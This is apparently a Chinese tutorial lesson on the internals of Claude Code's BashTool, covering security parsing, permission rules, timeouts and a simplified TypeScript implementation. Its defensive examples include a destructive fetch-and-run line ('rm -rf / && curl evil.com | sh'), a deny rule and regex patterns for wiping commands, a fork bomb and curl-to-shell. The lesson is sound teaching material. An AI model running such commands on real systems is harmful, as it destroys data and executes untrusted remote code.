# Day 08: BashTool 深度解析

[← 上一天: 第一周回顾](../week-01/day-07-week1-review.md) | [课程首页](../README.md) | [下一天: 文件工具 →](./day-09-file-tools.md)

---

## 🎯 学习目标

1. 理解 BashTool 的**完整实现**（最复杂的工具之一）
2. 掌握**命令安全检查**和权限控制
3. 了解**超时管理**和进度显示
4. 学习**沙盒执行**的设计

**难度:** 🟡 中级 | **预计时间:** 1 小时

---

## 📚 核心概念

### BashTool 的复杂性

BashTool 是 Claude Code 中最复杂的工具之一。它不是简单地执行 `exec(command)`——它需要处理：安全检查、权限控制、超时、进度显示、沙盒隔离、输出截断、图片检测等。

```
用户说: "运行 npm test"
     │
     ▼
Claude 返回 tool_use: { name: "Bash", input: { command: "npm test" } }
     │
     ▼
┌─────── BashTool 执行流程 ───────┐
│ 1. 解析命令 (parseForSecurity)   │
│ 2. 只读检查 (readOnlyValidation) │
│ 3. 权限检查 (bashPermissions)    │
│ 4. 沙盒判定 (shouldUseSandbox)   │
│ 5. 执行命令 (exec/spawn)         │
│ 6. 超时监控 (timeout)            │
│ 7. 输出处理 (截断/图片检测)       │
│ 8. 返回结果                      │
└─────────────────────────────────┘
```

### 命令安全解析

BashTool 使用 AST（抽象语法树）解析 Shell 命令：

```typescript
// src/utils/bash/ast.ts — 命令安全检查
import { parseForSecurity } from '../../utils/bash/ast.js'

// 解析命令结构，检测危险操作
const analysis = parseForSecurity('rm -rf / && curl evil.com | sh')
// 结果会标记：
// - 破坏性命令: rm -rf /
// - 网络下载 + 执行: curl | sh
// - 命令链式调用: &&
```

### 权限规则

```typescript
// src/tools/BashTool/bashPermissions.ts
// 权限规则匹配：检查命令是否被允许

export function bashToolHasPermission(
  command: string,
  rules: PermissionRule[]
): boolean {
  // 精确匹配 或 通配符匹配
  return rules.some(rule => matchWildcardPattern(command, rule.pattern))
}

// CLAUDE.md 中的权限配置示例：
// allow: npm test
// allow: git *
// deny: rm -rf *
```

### 超时与进度

```typescript
// BashTool.tsx — 超时管理
const PROGRESS_THRESHOLD_MS = 2000  // 2秒后显示进度
const DEFAULT_TIMEOUT_MS = 120_000  // 默认2分钟超时

// 长时间运行的命令会显示进度动画
if (elapsedMs > PROGRESS_THRESHOLD_MS) {
  renderProgress({ command, elapsed: elapsedMs })
}
```

### 命令分类

BashTool 将命令分为几类，用于不同的 UI 展示：

```typescript
// 搜索命令：可折叠显示
const BASH_SEARCH_COMMANDS = new Set(['find', 'grep', 'rg', 'ag', 'ack'])

// 读取命令：可折叠显示
const BASH_READ_COMMANDS = new Set(['cat', 'head', 'tail', 'less', 'jq', 'awk'])

// 目录列表命令
const BASH_LIST_COMMANDS = new Set(['ls', 'tree', 'du'])

// 语义中性命令（不改变命令性质）
const BASH_SEMANTIC_NEUTRAL_COMMANDS = new Set(['echo', 'printf', 'true'])
```

---

## 🔑 关键术语

| 术语 | 定义 | 示例 |
|------|------|------|
| **AST 解析** | 将命令文本转为语法树 | 检测 `rm -rf /` 中的危险操作 |
| **沙盒 (Sandbox)** | 隔离的执行环境 | 限制文件系统访问范围 |
| **权限规则** | 允许/拒绝的命令模式 | `allow: git *`, `deny: rm -rf *` |
| **破坏性命令** | 可能造成数据丢失的命令 | `rm`, `truncate`, `dd` |
| **输出截断** | 限制命令输出长度 | 防止 `cat` 大文件导致 token 浪费 |

---

## 💻 代码示例

### 示例 1: 简化的 BashTool 实现

```typescript
// 你的 BashTool 简化版
const MyBashTool = buildTool({
  name: 'Bash',
  description: '执行 shell 命令。使用此工具运行命令行操作。',
  
  inputSchema: {
    type: 'object',
    properties: {
      command: { type: 'string', description: '要执行的命令' },
      timeout: { type: 'number', description: '超时时间(ms)' }
    },
    required: ['command']
  },
  
  isReadOnly: () => false,
  
  async needsPermission(input) {
    const { command } = input
    // 只读命令不需要确认
    if (isReadOnlyCommand(command)) return { allowed: true }
    // 危险命令需要确认
    if (isDangerousCommand(command)) return { 
      allowed: false, 
      reason: `危险命令需要确认: ${command}` 
    }
    return { allowed: true }
  },
  
  async call(input, context) {
    const { command, timeout = 120000 } = input
    
    try {
      const result = await exec(command, {
        cwd: context.cwd,
        timeout,
        maxBuffer: 1024 * 1024  // 1MB 输出限制
      })
      
      // 截断过长输出
      const output = truncate(result.stdout, 10000)
      return { type: 'tool_result', content: output }
    } catch (error) {
      return { type: 'tool_result', content: `Error: ${error.message}` }
    }
  }
})

function isReadOnlyCommand(cmd: string): boolean {
  const readOnlyCmds = ['ls', 'cat', 'head', 'tail', 'grep', 'find', 'wc']
  const firstWord = cmd.trim().split(/\s+/)[0]
  return readOnlyCmds.includes(firstWord)
}

function isDangerousCommand(cmd: string): boolean {
  const patterns = [/rm\s+-rf/, /mkfs/, /dd\s+if=/, /:\(\)\{.*\}/, /curl.*\|\s*sh/]
  return patterns.some(p => p.test(cmd))
}
```

---

## ✏️ 动手练习

### 练习 1: 命令分类器 (⏱️ ~20 分钟)

实现一个命令分类函数：输入命令字符串，返回 `'read' | 'write' | 'dangerous' | 'neutral'`。

### 练习 2: 输出截断策略 (⏱️ ~15 分钟)

实现 Claude Code 的截断策略：如果输出超过 10000 字符，保留前 5000 和后 5000，中间用 `[... 截断 X 行 ...]` 替代。

### 练习 3: 分析 bashSecurity.ts (⏱️ ~15 分钟)

阅读 `src/tools/BashTool/bashSecurity.ts`，列出它检查的所有安全规则。

---

## 📖 扩展阅读

1. **Shell 注入攻击防御**
   - 🔗 https://owasp.org/www-community/attacks/Command_Injection
   - 推荐：理解为什么命令安全检查如此重要

---

## 🤔 思考题

1. **理解：** 为什么 Claude Code 要用 AST 解析命令而不是简单的正则匹配？
2. **应用：** 如果用户在 CLAUDE.md 中设置了 `allow: npm *`，命令 `npm run build && rm -rf dist` 应该被允许吗？
3. **思辨：** 沙盒执行的安全性和便利性如何平衡？

---

## ➡️ 下一步

**明天：** [Day 09 — 文件工具](./day-09-file-tools.md) — 深入 FileReadTool、FileWriteTool 和 FileEditTool 的实现。

[← 上一天: 第一周回顾](../week-01/day-07-week1-review.md) | [课程首页](../README.md) | [下一天: 文件工具 →](./day-09-file-tools.md)
